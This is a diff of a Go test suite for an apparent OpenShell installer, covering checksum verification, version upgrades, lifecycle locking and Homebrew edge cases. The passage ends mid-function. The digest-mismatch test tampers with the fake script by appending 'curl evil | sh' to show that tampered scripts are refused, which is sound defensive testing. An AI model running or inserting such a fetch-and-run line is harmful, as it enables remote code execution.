@@ -32,6 +32,7 @@ import (
 	"strings"
 	"sync/atomic"
 	"testing"
+	"time"
 
 	v1 "github.com/NVIDIA/OpenShell/sdk/go/openshell/v1"
 
@@ -50,7 +51,13 @@ type installFixture struct {
 	tempDir  string
 	out      bytes.Buffer
 	verified int
+	// prepared counts the installer's PrepareUpgrade calls, which a test
+	// may replace.
+	prepared int
 	inst     *openshell.Installer
+	// lockDir is the configuration directory of the lifecycle lock the
+	// installer takes for an upgrade (Installer.LockLifecycle).
+	lockDir string
 	// scriptSeen is the script content and mode observed while the
 	// installer ran.
 	scriptSeen []byte
@@ -71,7 +78,7 @@ func newInstallFixture(t *testing.T, body, existing, after string) *installFixtu
 	f := &installFixture{t: t, runner: &openshelltest.Runner{}}
 	f.srv = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		f.hits.Add(1)
-		if r.URL.Path != "/NVIDIA/OpenShell/v0.1.1/install.sh" {
+		if r.URL.Path != "/NVIDIA/OpenShell/"+openshell.InstallerTag+"/install.sh" {
 			http.NotFound(w, r)
 			return
 		}
@@ -80,6 +87,7 @@ func newInstallFixture(t *testing.T, body, existing, after string) *installFixtu
 	t.Cleanup(f.srv.Close)
 	f.cliPath = filepath.Join(t.TempDir(), "openshell")
 	f.tempDir = t.TempDir()
+	f.lockDir = t.TempDir()
 	version := existing
 	if existing != "" {
 		writeExecutable(t, f.cliPath)
@@ -104,9 +112,9 @@ func newInstallFixture(t *testing.T, body, existing, after string) *installFixtu
 	})
 	f.inst = &openshell.Installer{
 		HTTPClient: f.srv.Client(),
-		URL:        f.srv.URL + "/NVIDIA/OpenShell/v0.1.1/install.sh",
+		URL:        f.srv.URL + "/NVIDIA/OpenShell/" + openshell.InstallerTag + "/install.sh",
 		SHA256:     sha(body),
-		Release:    "v0.1.1",
+		Release:    openshell.InstallerTag,
 		TempDir:    f.tempDir,
 		Runner:     f.runner,
 		LookPath:   func(string) (string, error) { return "", errors.New("not on PATH") },
@@ -126,6 +134,8 @@ func newInstallFixture(t *testing.T, body, existing, after string) *installFixtu
 		VerifyGateway:         func(context.Context) error { f.verified++; return nil },
 		Geteuid:               func() int { return 1000 },
 		HomebrewPrefixProblem: func() error { return nil },
+		LockLifecycle:         func(ctx context.Context) (func(), error) { return openshell.LockGatewayLifecycle(ctx, f.lockDir) },
+		PrepareUpgrade:        func(context.Context, openshell.Version) error { f.prepared++; return nil },
 	}
 	return f
 }
@@ -166,16 +176,16 @@ func TestInstallFresh(t *testing.T) {
 	for _, v := range inherited {
 		t.Setenv(v, "inherited")
 	}
-	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+	f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 	res, err := f.inst.Install(context.Background())
-	if err != nil || !res.Installed || res.CLIVersion.String() != "0.1.1" || f.verified != 1 {
+	if err != nil || !res.Installed || res.CLIVersion.String() != openshell.InstallerVersion || f.verified != 1 {
 		t.Fatalf("Install = %+v, %v (gateway verified %d times)", res, err, f.verified)
 	}
 	if string(f.scriptSeen) != fakeScript || f.scriptMode != 0o600 {
 		t.Fatalf("script run = %q mode %04o, want the verified bytes 0600", f.scriptSeen, f.scriptMode)
 	}
 	run := f.scriptRun()
-	if !slices.Equal(run.Env, []string{"OPENSHELL_VERSION=v0.1.1", "OPENSHELL_REGISTER_BIN=" + f.cliPath}) {
+	if !slices.Equal(run.Env, []string{"OPENSHELL_VERSION=" + openshell.InstallerTag, "OPENSHELL_REGISTER_BIN=" + f.cliPath}) {
 		t.Fatalf("installer env = %v", run.Env)
 	}
 	for _, v := range inherited {
@@ -184,7 +194,7 @@ func TestInstallFresh(t *testing.T) {
 		}
 	}
 	plan := f.out.String()
-	for _, want := range []string{"v0.1.1", f.inst.URL, sha(fakeScript), "OPENSHELL_VERSION=v0.1.1 OPENSHELL_REGISTER_BIN=" + f.cliPath + " /bin/sh "} {
+	for _, want := range []string{openshell.InstallerTag, f.inst.URL, sha(fakeScript), "OPENSHELL_VERSION=" + openshell.InstallerTag + " OPENSHELL_REGISTER_BIN=" + f.cliPath + " /bin/sh "} {
 		if !strings.Contains(plan, want) {
 			t.Errorf("plan lacks %q:\n%s", want, plan)
 		}
@@ -208,7 +218,7 @@ func TestInstallChecksSudoFirst(t *testing.T) {
 		"cancelled": fmt.Errorf("sudo: %w", openshell.ErrInterrupted),
 	} {
 		t.Run(name, func(t *testing.T) {
-			f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+			f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 			f.runner.On("sudo -n true", "sudo: a password is required", errors.New("exit status 1"))
 			f.runner.On("sudo -v", "", answer)
 			_, err := f.inst.Install(context.Background())
@@ -222,7 +232,7 @@ func TestInstallChecksSudoFirst(t *testing.T) {
 		})
 	}
 	// An installer the user interrupts says so, and leaves nothing behind.
-	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+	f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 	f.runner.On("/bin/sh", "", fmt.Errorf("/bin/sh: %w", openshell.ErrInterrupted))
 	if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrInterrupted) || !strings.Contains(err.Error(), "the installer was interrupted") {
 		t.Fatalf("Install = %v, want the interruption", err)
@@ -231,7 +241,7 @@ func TestInstallChecksSudoFirst(t *testing.T) {
 }
 
 func TestInstallRefusesDigestMismatch(t *testing.T) {
-	f := newInstallFixture(t, fakeScript+"curl evil | sh\n", "", "openshell 0.1.1")
+	f := newInstallFixture(t, fakeScript+"curl evil | sh\n", "", "openshell "+openshell.InstallerVersion)
 	f.inst.SHA256 = sha(fakeScript)
 	consented := false
 	f.inst.Consent = func(*openshell.InstallPlan) (bool, error) { consented = true; return true, nil }
@@ -264,7 +274,7 @@ func TestInstallRefusals(t *testing.T) {
 		{"no consent callback", func(f *installFixture) { f.inst.Consent = nil }, nil, ""},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
-			f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+			f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 			tc.mutate(f)
 			_, err := f.inst.Install(context.Background())
 			if err == nil || !strings.Contains(err.Error(), tc.wantErr) || (tc.wantIs != nil && !errors.Is(err, tc.wantIs)) {
@@ -278,21 +288,36 @@ func TestInstallRefusals(t *testing.T) {
 	}
 }
 
+// TestInstallExistingReleases: Install keeps a supported OpenShell
+// (openshell.SupportedMin or later) and refuses a newer minor. One older
+// than SupportedMin runs no sandbox, and Install upgrades it in place
+// (the owner's 0.1.5 floor): each legacy release DefenseClaw 1.0.0 to 1.0.3
+// left a host on (0.1.1 to 0.1.4), each prerelease of 0.1.5 however it is
+// reported, and the older releases the installer upgrades in place. Every
+// in-place upgrade runs PrepareUpgrade before the script, which restarts
+// the gateway.
 func TestInstallExistingReleases(t *testing.T) {
-	for _, tc := range []struct {
+	type row struct {
 		name, existing string
 		installed      bool
 		unsupported    bool
 		downloads      int32
-	}{
-		{name: "supported is kept", existing: "openshell 0.1.3"},
+	}
+	rows := []row{
+		{name: "supported is kept", existing: "openshell " + openshell.SupportedMin},
+		{name: "a later supported release is kept", existing: "openshell 0.1.9"},
+		{name: "a prerelease of a later release is kept", existing: "openshell 0.1.6-pre.1"},
 		{name: "newer minor refused", existing: "openshell 0.2.0", unsupported: true},
 		{name: "0.1.0 upgraded in place", existing: "openshell 0.1.0", installed: true, downloads: 1},
 		// As doctor advises: 0.0.37 and later need no cleanup.
 		{name: "0.0.40 upgraded in place", existing: "openshell 0.0.40", installed: true, downloads: 1},
-	} {
+	}
+	for _, legacy := range []string{"0.1.1", "0.1.2", "0.1.3", "0.1.4", "0.1.1-1", "0.1.5-pre.1", "0.1.5-pre.3", "0.1.5-pre.4", "0.1.5-dev.7+gabc"} {
+		rows = append(rows, row{name: "legacy " + legacy + " upgraded in place", existing: "openshell " + legacy, installed: true, downloads: 1})
+	}
+	for _, tc := range rows {
 		t.Run(tc.name, func(t *testing.T) {
-			f := newInstallFixture(t, fakeScript, tc.existing, "openshell 0.1.1")
+			f := newInstallFixture(t, fakeScript, tc.existing, "openshell "+openshell.InstallerVersion)
 			res, err := f.inst.Install(context.Background())
 			var u *openshell.ErrUnsupportedVersion
 			if tc.unsupported != errors.As(err, &u) || (!tc.unsupported && (err != nil || res.Installed != tc.installed)) {
@@ -301,7 +326,11 @@ func TestInstallExistingReleases(t *testing.T) {
 			if got := f.hits.Load(); got != tc.downloads {
 				t.Fatalf("downloads = %d, want %d", got, tc.downloads)
 			}
-			if tc.installed && !strings.Contains(f.out.String(), "upgrades the installed "+tc.existing+" to v0.1.1 in place") {
+			// The script restarts the gateway only after PrepareUpgrade.
+			if want := map[bool]int{true: 1, false: 0}[tc.installed]; f.prepared != want {
+				t.Fatalf("PrepareUpgrade ran %d times, want %d", f.prepared, want)
+			}
+			if tc.installed && !strings.Contains(f.out.String(), "upgrades the installed "+tc.existing+" to "+openshell.InstallerTag+" in place") {
 				t.Fatalf("plan lacks the in-place note:\n%s", f.out.String())
 			}
 			if strings.Contains(f.out.String(), "ACK_BREAKING") {
@@ -365,15 +394,33 @@ func TestInstallUpgradesInPlace(t *testing.T) {
 			t.Fatalf("plan:\n%s", plan)
 		}
 	})
-	t.Run("Install keeps it", func(t *testing.T) {
-		f, prepared := setup(t, "openshell 0.1.1", "openshell "+openshell.InstallerVersion)
+	// A legacy release runs no sandbox: Install upgrades it in place too,
+	// through the same PrepareUpgrade, and a refusal there runs nothing.
+	t.Run("Install upgrades a legacy one", func(t *testing.T) {
+		f, prepared := setup(t, "openshell 0.1.3", "openshell "+openshell.InstallerVersion)
+		if res, err := f.inst.Install(context.Background()); err != nil || !res.Installed || f.hits.Load() != 1 || !f.ran() || *prepared != 1 {
+			t.Fatalf("Install = %+v, %v (downloads %d, prepared %d)", res, err, f.hits.Load(), *prepared)
+		}
+		if !strings.Contains(f.out.String(), "upgrades the installed openshell 0.1.3 to "+openshell.InstallerTag+" in place") {
+			t.Fatalf("plan:\n%s", f.out.String())
+		}
+	})
+	t.Run("Install of a legacy one waits for a MicroVM", func(t *testing.T) {
+		f, _ := setup(t, "openshell 0.1.3", "openshell "+openshell.InstallerVersion)
+		f.inst.PrepareUpgrade = func(context.Context, openshell.Version) error { return openshell.ErrSandboxesRunning }
+		if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrSandboxesRunning) || f.ran() {
+			t.Fatalf("Install = %v (ran %v)", err, f.ran())
+		}
+	})
+	t.Run("Install keeps a supported one", func(t *testing.T) {
+		f, prepared := setup(t, "openshell "+openshell.SupportedMin, "openshell 0.1.9")
 		if res, err := f.inst.Install(context.Background()); err != nil || res.Installed || f.hits.Load() != 0 || f.ran() || *prepared != 0 {
 			t.Fatalf("Install = %+v, %v (downloads %d, prepared %d)", res, err, f.hits.Load(), *prepared)
 		}
 	})
 	for _, existing := range []string{"openshell " + openshell.InstallerVersion, "openshell 0.1.9"} {
 		t.Run("never downgrades "+existing, func(t *testing.T) {
-			f, prepared := setup(t, existing, "openshell 0.1.1")
+			f, prepared := setup(t, existing, "openshell "+openshell.InstallerVersion)
 			if res, err := f.inst.Upgrade(context.Background()); err != nil || res.Installed || f.hits.Load() != 0 || f.ran() || *prepared != 0 {
 				t.Fatalf("Upgrade = %+v, %v (downloads %d, prepared %d)", res, err, f.hits.Load(), *prepared)
 			}
@@ -399,10 +446,51 @@ func TestInstallUpgradesInPlace(t *testing.T) {
 	})
 	t.Run("the old CLI still answers", func(t *testing.T) {
 		f, _ := setup(t, "openshell 0.1.1", "")
-		if _, err := f.inst.Upgrade(context.Background()); err == nil || !strings.Contains(err.Error(), `still reports "openshell 0.1.1", not `+openshell.InstallerVersion) {
+		if _, err := f.inst.Upgrade(context.Background()); err == nil || !strings.Contains(err.Error(), `reports "openshell 0.1.1"`) {
 			t.Fatalf("Upgrade = %v", err)
 		}
 	})
+}
+
+// TestUpgradeHoldsTheLifecycleLock: NVIDIA's script restarts the gateway
+// minutes after PrepareUpgrade's check, and a sandbox DefenseClaw started
+// meanwhile was stopped by that restart without a flush. The upgrade now
+// holds the lifecycle lock from the check to the healthy gateway, so
+// DefenseClaw's create and start are refused throughout and allowed
+// again after it; one in flight when the upgrade begins makes it wait,
+// and one held past the wait refuses the upgrade with nothing run.
+func TestUpgradeHoldsTheLifecycleLock(t *testing.T) {
+	f := newInstallFixture(t, fakeScript, "openshell 0.1.1", "openshell "+openshell.InstallerVersion)
+	f.inst.Release = openshell.InstallerTag
+	var during []error
+	starts := func() { _, err := openshell.LockSandboxStart(f.lockDir); during = append(during, err) }
+	f.inst.PrepareUpgrade = func(context.Context, openshell.Version) error { starts(); return nil }
+	f.inst.VerifyGateway = func(context.Context) error { f.verified++; starts(); return nil }
+	if _, err := f.inst.Upgrade(context.Background()); err != nil {
+		t.Fatal(err)
+	}
+	if len(during) != 2 || !errors.Is(during[0], openshell.ErrGatewayBusy) || !errors.Is(during[1], openshell.ErrGatewayBusy) || !f.ran() {
+		t.Fatalf("a start during the check and after the script: %v (script ran %v)", during, f.ran())
+	}
+	unlock, err := openshell.LockSandboxStart(f.lockDir)
+	if err != nil {
+		t.Fatalf("a start after the upgrade: %v", err)
+	}
+
+	// A start in flight: the upgrade waits for it, and refuses once the
+	// wait is over, with nothing run.
+	openshell.SetLifecycleLockWait(t, 300*time.Millisecond)
+	g := newInstallFixture(t, fakeScript, "openshell 0.1.1", "openshell "+openshell.InstallerVersion)
+	g.inst.Release, g.lockDir = openshell.InstallerTag, f.lockDir
+	prepared := false
+	g.inst.PrepareUpgrade = func(context.Context, openshell.Version) error { prepared = true; return nil }
+	if _, err := g.inst.Upgrade(context.Background()); !errors.Is(err, openshell.ErrGatewayBusy) || prepared || g.ran() {
+		t.Fatalf("an upgrade under a start in flight: %v (prepared %v, script ran %v)", err, prepared, g.ran())
+	}
+	unlock()
+	if _, err := g.inst.Upgrade(context.Background()); err != nil || !prepared {
+		t.Fatalf("the upgrade once the start ended: %v (prepared %v)", err, prepared)
+	}
 }
 
 // TestPrepareUpgrade: NVIDIA's script restarts the gateway only once it
@@ -434,40 +522,40 @@ func TestPrepareUpgrade(t *testing.T) {
 	unavailable := &v1.StatusError{Code: v1.ErrorUnavailable, Message: "connection refused"}
 
 	c, _ := gateway(t, openshell.DriverDocker, running)
-	if err := openshell.PrepareUpgrade(context.Background(), c, pull); err != nil || pulls != 1 {
+	if err := openshell.PrepareUpgrade(context.Background(), c, pull, noMicroVMs); err != nil || pulls != 1 {
 		t.Fatalf("docker: %v, pulled %d times", err, pulls)
 	}
 	pullErr := fmt.Errorf("%w (docker pull: offline)", openshell.ErrRuntimeImages)
-	if err := openshell.PrepareUpgrade(context.Background(), c, func(context.Context) error { return pullErr }); !errors.Is(err, openshell.ErrRuntimeImages) {
+	if err := openshell.PrepareUpgrade(context.Background(), c, func(context.Context) error { return pullErr }, noMicroVMs); !errors.Is(err, openshell.ErrRuntimeImages) {
 		t.Fatalf("docker, pull failed: %v", err)
 	}
 
 	pulls = 0
 	c, _ = gateway(t, openshell.DriverVM, running)
-	err := openshell.PrepareUpgrade(context.Background(), c, pull)
-	if !errors.Is(err, openshell.ErrSandboxesRunning) || !strings.Contains(err.Error(), "(dc-a, dc-b): stop them first with `defenseclaw sandbox stop NAME`") || pulls != 0 {
+	err := openshell.PrepareUpgrade(context.Background(), c, pull, noMicroVMs)
+	if !errors.Is(err, openshell.ErrSandboxesRunning) || !strings.Contains(err.Error(), "dc-a (ready): `defenseclaw sandbox stop dc-a` (DefenseClaw sandbox), or `openshell sandbox stop dc-a` (raw OpenShell sandbox); dc-b (provisioning): wait until") || pulls != 0 {
 		t.Fatalf("vm, sandboxes running: %v (pulled %d times)", err, pulls)
 	}
 	c, _ = gateway(t, openshell.DriverVM, map[string]openshell.SandboxPhase{"dc-c": openshell.PhaseStopped})
-	if err := openshell.PrepareUpgrade(context.Background(), c, pull); err != nil || pulls != 0 {
+	if err := openshell.PrepareUpgrade(context.Background(), c, pull, noMicroVMs); err != nil || pulls != 0 {
 		t.Fatalf("vm, none running: %v (pulled %d times)", err, pulls)
 	}
 
 	c, f := gateway(t, openshell.DriverVM, running)
 	f.FailNext(openshelltest.MethodGatewayInfo, &v1.StatusError{Code: v1.ErrorDeadlineExceeded, Message: "context deadline exceeded"})
-	if err := openshell.PrepareUpgrade(context.Background(), c, pull); !errors.Is(err, openshell.ErrSandboxesRunning) || pulls != 0 {
+	if err := openshell.PrepareUpgrade(context.Background(), c, pull, noMicroVMs); !errors.Is(err, openshell.ErrSandboxesRunning) || pulls != 0 {
 		t.Fatalf("driver unknown, sandboxes running: %v (pulled %d times)", err, pulls)
 	}
 	c, f = gateway(t, openshell.DriverVM, running)
 	f.FailNext(openshelltest.MethodGatewayInfo, &v1.StatusError{Code: v1.ErrorDeadlineExceeded, Message: "context deadline exceeded"})
 	f.FailNext(openshelltest.MethodListSandboxes, &v1.StatusError{Code: v1.ErrorInternal, Message: "store locked"})
-	if err := openshell.PrepareUpgrade(context.Background(), c, pull); !errors.Is(err, openshell.ErrSandboxesRunning) || !strings.Contains(err.Error(), "could not be listed: ") {
+	if err := openshell.PrepareUpgrade(context.Background(), c, pull, noMicroVMs); !errors.Is(err, openshell.ErrSandboxesRunning) || !strings.Contains(err.Error(), "could not be listed: ") {
 		t.Fatalf("driver unknown, list failed: %v", err)
 	}
 	c, f = gateway(t, openshell.DriverVM, running)
 	f.FailNext(openshelltest.MethodGatewayInfo, unavailable)
 	f.FailNext(openshelltest.MethodListSandboxes, unavailable)
-	if err := openshell.PrepareUpgrade(context.Background(), c, pull); err != nil || pulls != 0 {
+	if err := openshell.PrepareUpgrade(context.Background(), c, pull, noMicroVMs); err != nil || pulls != 0 {
 		t.Fatalf("gateway down: %v (pulled %d times)", err, pulls)
 	}
 }
@@ -526,20 +614,20 @@ func TestInstallBreakingUpgrade(t *testing.T) {
 	for _, existing := range []string{"openshell 0.0.16", "openshell (build 1f2e)"} {
 		t.Run(existing, func(t *testing.T) {
 			// No confirmation callback: refused, with the cleanup explained.
-			f := newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
+			f := newInstallFixture(t, fakeScript, existing, "openshell "+openshell.InstallerVersion)
 			if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() ||
 				!strings.Contains(f.out.String(), "openshell sandbox delete --all && openshell gateway destroy") {
 				t.Fatalf("Install = %v (ran %v), plan:\n%s", err, f.ran(), f.out.String())
 			}
 			f.assertNoLeftovers()
 
-			f = newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
+			f = newInstallFixture(t, fakeScript, existing, "openshell "+openshell.InstallerVersion)
 			f.inst.ConfirmBreakingUpgrade = func(*openshell.InstallPlan) (bool, error) { return false, nil }
 			if _, err := f.inst.Install(context.Background()); !errors.Is(err, openshell.ErrBreakingUpgrade) || f.ran() {
 				t.Fatalf("declined: Install = %v (ran %v)", err, f.ran())
 			}
 
-			f = newInstallFixture(t, fakeScript, existing, "openshell 0.1.1")
+			f = newInstallFixture(t, fakeScript, existing, "openshell "+openshell.InstallerVersion)
 			var confirmed *openshell.InstallPlan
 			f.inst.ConfirmBreakingUpgrade = func(p *openshell.InstallPlan) (bool, error) { confirmed = p; return true, nil }
 			if res, err := f.inst.Install(context.Background()); err != nil || !res.Installed || confirmed == nil || !confirmed.BreakingUpgrade {
@@ -559,7 +647,7 @@ func TestInstallBreakingUpgrade(t *testing.T) {
 // first on PATH is reported, not passed.
 func TestInstallReplacesLegacyCLI(t *testing.T) {
 	setup := func(t *testing.T) (*installFixture, string) {
-		f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+		f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 		legacy := filepath.Join(t.TempDir(), "openshell")
 		writeExecutable(t, legacy)
 		f.runner.On(legacy+" --version", "openshell 0.0.36\n", nil)
@@ -589,7 +677,7 @@ func TestInstallReplacesLegacyCLI(t *testing.T) {
 	t.Run("removed as the plan says", func(t *testing.T) {
 		f, legacy := setup(t)
 		f.inst.ConfirmBreakingUpgrade = func(*openshell.InstallPlan) (bool, error) { return true, os.Remove(legacy) }
-		if res, err := f.inst.Install(context.Background()); err != nil || res.CLIVersion.String() != "0.1.1" {
+		if res, err := f.inst.Install(context.Background()); err != nil || res.CLIVersion.String() != openshell.InstallerVersion {
 			t.Fatalf("Install = %+v, %v", res, err)
 		}
 	})
@@ -609,7 +697,7 @@ func TestInstallNeverRunsRelativeCandidates(t *testing.T) {
 		{name: "relative candidate", home: "/nonexistent-home", candidates: []string{filepath.Join(".local", "bin", "openshell")}},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
-			f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+			f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 			work := t.TempDir()
 			for _, dir := range []string{work, filepath.Join(work, "relhome")} {
 				if err := os.MkdirAll(filepath.Join(dir, ".local", "bin"), 0o755); err != nil {
@@ -637,7 +725,7 @@ func TestInstallNeverRunsRelativeCandidates(t *testing.T) {
 			t.Fatal(err)
 		}
 		writeExecutable(t, cli)
-		f.runner.On(cli+" --version", "openshell 0.1.1\n", nil)
+		f.runner.On(cli+" --version", "openshell "+openshell.InstallerVersion+"\n", nil)
 		t.Setenv("HOME", home)
 		f.inst.Candidates = nil
 		if res, err := f.inst.Install(context.Background()); err != nil || res.Installed || res.Plan.Existing == nil || res.Plan.Existing.Path != cli {
@@ -654,10 +742,10 @@ func TestInstallVerifiesOutcome(t *testing.T) {
 	}{
 		{"cli still old", "openshell 0.0.40", nil, "0.0.40"},
 		{"no cli after install", "", nil, "no openshell CLI"},
-		{"gateway unhealthy", "openshell 0.1.1", func(f *installFixture) {
+		{"gateway unhealthy", "openshell " + openshell.InstallerVersion, func(f *installFixture) {
 			f.inst.VerifyGateway = func(context.Context) error { return errors.New("connection refused") }
 		}, "gateway is not healthy"},
-		{"installer fails", "openshell 0.1.1", func(f *installFixture) { f.runner.On("/bin/sh", "", errors.New("exit status 1")) }, "installer failed"},
+		{"installer fails", "openshell " + openshell.InstallerVersion, func(f *installFixture) { f.runner.On("/bin/sh", "", errors.New("exit status 1")) }, "installer failed"},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
 			f := newInstallFixture(t, fakeScript, "", tc.after)
@@ -679,7 +767,7 @@ func TestInstallVerifiesOutcome(t *testing.T) {
 // M6).
 func TestInstallFailureOnMacOSNamesHomebrew(t *testing.T) {
 	for goos, homebrew := range map[string]bool{"darwin": true, "linux": false} {
-		f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+		f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 		f.inst.GOOS = goos
 		f.runner.On("/bin/sh", "", errors.New("exit status 1"))
 		_, err := f.inst.Install(context.Background())
@@ -692,13 +780,13 @@ func TestInstallFailureOnMacOSNamesHomebrew(t *testing.T) {
 func TestInstallOnMacTMUXHandlesBrewServicesRefusal(t *testing.T) {
 	t.Setenv("TMUX", "/tmp/test-tmux")
 	for _, running := range []bool{false, true} {
-		f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+		f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 		f.inst.GOOS = "darwin"
 		f.runner.OnFunc("/bin/sh", func(context.Context, openshell.Command) ([]byte, error) {
 			writeExecutable(t, f.cliPath)
 			return []byte("Usage: brew services restart (formula)\nError: Invalid usage: `brew services` cannot run under tmux!\n"), nil
 		})
-		f.runner.On(f.cliPath+" --version", "openshell 0.1.1", nil)
+		f.runner.On(f.cliPath+" --version", "openshell "+openshell.InstallerVersion, nil)
 		f.inst.VerifyGateway = func(context.Context) error {
 			f.verified++
 			if running {
@@ -729,19 +817,19 @@ func TestInstallOnMacTMUXHandlesBrewServicesRefusal(t *testing.T) {
 func TestInstallInAHomebrewOfYourOwn(t *testing.T) {
 	prefix := filepath.Join(t.TempDir(), "homebrew")
 	tls := filepath.Join(prefix, "var", "openshell", "tls")
-	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+	f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 	f.inst.GOOS, f.inst.BrewPrefix = "darwin", prefix
 	res, err := f.inst.Install(context.Background())
 	if err != nil {
 		t.Fatal(err)
 	}
 	want := openshell.EnvLocalTLSDir + "=" + tls
-	if !slices.Contains(f.scriptRun().Env, want) || !slices.Contains(res.Plan.Env, want) || !strings.Contains(f.out.String(), "Command     OPENSHELL_VERSION=v0.1.1 "+want+" ") ||
+	if !slices.Contains(f.scriptRun().Env, want) || !slices.Contains(res.Plan.Env, want) || !strings.Contains(f.out.String(), "Command     OPENSHELL_VERSION="+openshell.InstallerTag+" "+want+" ") ||
 		!strings.Contains(f.out.String(), "Homebrew has no prebuilt packages for that prefix") {
 		t.Fatalf("env %v; plan:\n%s", f.scriptRun().Env, f.out.String())
 	}
 	// The prefixes the CLI searches need nothing.
-	f = newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+	f = newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 	f.inst.GOOS = "darwin"
 	if _, err := f.inst.Install(context.Background()); err != nil {
 		t.Fatal(err)
@@ -784,7 +872,7 @@ func TestInstallInAHomebrewOfYourOwn(t *testing.T) {
 			if scenario.before != "" {
 				linkKeg(scenario.before)
 			}
-			f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+			f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 			f.inst.GOOS, f.inst.BrewPrefix = "darwin", prefix
 			f.runner.OnFunc("/bin/sh", func(context.Context, openshell.Command) ([]byte, error) {
 				if scenario.during != "" {
@@ -814,7 +902,7 @@ func TestInstallRefusesAHomebrewThisUserCannotWrite(t *testing.T) {
 	if err := os.MkdirAll(taps, 0o755); err != nil {
 		t.Fatal(err)
 	}
-	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+	f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 	f.inst.GOOS, f.inst.BrewPrefix = "darwin", prefix
 	f.inst.Writable = func(dir string) bool { return dir != taps }
 	_, err := f.inst.Install(context.Background())
@@ -876,7 +964,7 @@ func TestHomebrewFailureReportsTheDeveloperTools(t *testing.T) {
 		{name: "no tools", xcode: "26.2"},
 	} {
 		t.Run(tc.name, func(t *testing.T) {
-			f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+			f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 			f.inst.GOOS = "darwin"
 			f.inst.XcodeApp = xcodeApp(t, tc.xcode)
 			if tc.noXcode {
@@ -927,7 +1015,7 @@ func TestHomebrewFailureReportsTheDeveloperTools(t *testing.T) {
 func TestInstallPlanOnMacOSSaysWhatItChanges(t *testing.T) {
 	t.Setenv("HOME", t.TempDir())
 	t.Setenv("XDG_CONFIG_HOME", "")
-	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+	f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 	f.inst.GOOS = "darwin"
 	res, err := f.inst.Install(context.Background())
 	if err != nil {
@@ -949,7 +1037,7 @@ func TestInstallPlanOnMacOSSaysWhatItChanges(t *testing.T) {
 		t.Fatalf("plan config dir = %q", res.Plan.ConfigDir)
 	}
 	// Linux's plan is the package's.
-	f = newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+	f = newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 	if _, err := f.inst.Install(context.Background()); err != nil {
 		t.Fatal(err)
 	}
@@ -962,7 +1050,7 @@ func TestInstallPlanOnMacOSSaysWhatItChanges(t *testing.T) {
 // e2fsprogs and a Hypervisor signature, which the installer gets from
 // Homebrew once the user agreed; a failure says what Homebrew said.
 func TestInstallerPreparesTheMicroVMDriver(t *testing.T) {
-	f := newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+	f := newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 	f.runner.On("brew install e2fsprogs", "", nil)
 	f.runner.On("brew postinstall nvidia/openshell/openshell", "Error: nvidia/openshell/openshell is not installed", errors.New("exit status 1"))
 	if err := f.inst.InstallE2fsprogs(context.Background()); err != nil || !f.runner.Called("brew install e2fsprogs") {
@@ -987,13 +1075,39 @@ func TestInstallerPreparesTheMicroVMDriver(t *testing.T) {
 				writeExecutable(t, filepath.Join(keg, tool))
 			}
 		}
-		f = newInstallFixture(t, fakeScript, "", "openshell 0.1.1")
+		f = newInstallFixture(t, fakeScript, "", "openshell "+openshell.InstallerVersion)
 		f.inst.GOOS, f.inst.E2fsprogsDirs = "darwin", []string{keg}
 		if _, err := f.inst.Install(context.Background()); err != nil {
 			t.Fatal(err)
 		}
 		if strings.Contains(f.out.String(), note) == installed {
 			t.Fatalf("e2fsprogs installed %t, plan:\n%s", installed, f.out.String())
+		}
+	}
+}
+
+// TestAnUpgradeOverAGatewayItCannotReadWaitsForItsMicroVMs: the default
+// PrepareUpgrade finds no usable registration of the gateway, whose
+// MicroVM runs as the account (a registration that broke). It used to
+// take that for a gateway with nothing to stop and run NVIDIA's script,
+// whose restart ended the MicroVM with no flush. It now refuses with
+// nothing run, for a legacy release too, and upgrades once none runs.
+func TestAnUpgradeOverAGatewayItCannotReadWaitsForItsMicroVMs(t *testing.T) {
+	for _, existing := range []string{"openshell 0.1.3", "openshell 0.1.5-pre.3"} {
+		f := newInstallFixture(t, fakeScript, existing, "openshell "+openshell.InstallerVersion)
